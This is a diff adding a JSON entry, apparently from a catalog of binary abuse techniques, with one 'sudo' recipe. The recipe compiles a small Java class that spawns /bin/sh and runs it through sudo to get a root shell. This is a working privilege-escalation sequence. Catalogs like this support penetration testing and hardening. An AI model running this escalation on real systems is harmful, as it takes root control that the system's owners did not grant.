@@ -1,0 +1,10 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "",
+        "code": "TD=$(mktemp -d)\nSOURCE='public class Exec { public static void main(String[] args) throws Exception { new ProcessBuilder(\"/bin/sh\").inheritIO().start().waitFor(); } }'\necho \"$SOURCE\" > $TD/Exec.java\njavac $TD/Exec.java\nsudo java -cp $TD Exec\n"
+      }
+    ]
+  }
+}
